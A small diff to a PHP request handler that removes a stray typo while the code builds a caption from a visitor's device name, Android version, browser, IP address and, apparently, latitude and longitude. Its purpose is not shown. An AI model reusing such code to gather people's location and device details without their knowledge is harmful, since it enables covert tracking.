@@ -73,7 +73,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $caption .= "  - Device Name: " . $deviceInfo['device'] . "\n";
     $caption .= "  - Android Version: " . $deviceInfo['android_version'] . "\n";
     $caption .= "  - Browser: $browserInfo\n";
-    $caption .= "  - IP Address: $ipAddress\n";q
+    $caption .= "  - IP Address: $ipAddress\n";
     $latitude = null;
     $longitude = null;
 if (isset($data['latitude'], $data['longitude'])) {
